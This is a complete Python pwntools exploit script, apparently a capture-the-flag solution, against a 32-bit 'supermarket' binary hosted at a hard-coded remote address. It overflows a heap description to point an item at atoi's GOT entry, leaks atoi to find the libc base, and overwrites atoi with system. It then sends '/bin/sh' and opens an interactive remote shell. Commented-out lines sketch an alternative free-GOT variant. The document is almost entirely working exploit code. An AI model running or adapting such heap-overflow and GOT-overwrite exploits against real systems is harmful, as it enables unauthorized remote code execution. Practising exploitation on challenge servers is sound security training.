from pwn import *
from LibcSearcher import *
import pwnlib
# p=process('./supermarket')
def debug():
	pwnlib.gdb.attach(p)
# p=remote('pwn.buuoj.cn',20002)
p=remote('111.200.241.244',50296)
context.log_level = 'debug'
# context(arch='i386', os='linux')
context.terminal = ['tmux','splitw','-h']
context(os='linux', arch='i386', log_level='debug')
# sh = process('./ret2libc164')
# gdb.attach(p)

elf=ELF('./supermarket')
def add(name,size,text):
	p.recvuntil('>>')
	p.sendline('1')
	p.recvuntil('name:')
	p.sendline(name)
	p.recvuntil('price:')
	p.sendline('0x10')
	p.recvuntil('descrip_size:')
	p.sendline(str(size))
	p.recvuntil('description:')
	p.sendline(text)
def edit_des(name,size,text):
	p.recvuntil('>>')
	p.sendline('5')
	p.recvuntil('name:')
	p.sendline(name)
	p.recvuntil('descrip_size:')
	p.sendline(str(size))
	p.recvuntil('description:')
	p.sendline(text)
def show():
	p.recvuntil('>>')
	p.sendline('3')

atoi_got = elf.got['atoi']
add('0',0x80,'aaa')
add('1',0x20,'bbb')
edit_des('0',0x90,'ddd')
add('2',0x20,'eee')
payload = '2'.ljust(16,'\x00') + p32(0x20) + p32(0x20) + p32(atoi_got)
edit_des('0',0x80,payload)
show()
p.recvuntil('price.32, des.')
atoi_addr = u32(p.recv(4))
print('atoi_addr:',hex(atoi_addr))

# libc = ELF('/lib/i386-linux-gnu/libc-2.23.so')
libc = ELF('./libc.so.6')
libc_base = atoi_addr - libc.symbols['atoi']
print('libc_base:',hex(libc_base))
system = libc_base + libc.symbols['system']
# payload ='A' * 0x10 + p32(0x20) + p32(0x20) + p32(read_got)
edit_des('2',0x20,p32(system))
p.sendlineafter('your choice>>','/bin/sh')
# add(0x8,0x8,'/bin/sh')
# dele(0)
# pause()
# add(0x100,0x19c,'a'*0x198+p32(elf.got['free']))

# show(1)
# free_addr=u32(p.recvuntil('\xf7')[-4:])
# log.success('free-addr: '+hex(free_addr))
# libc=LibcSearcher('free',free_addr)
# system_addr=libc.dump('system')+free_addr-libc.dump('free')
# update(1,0x4,p32(system_addr))
# dele(2)
p.interactive()




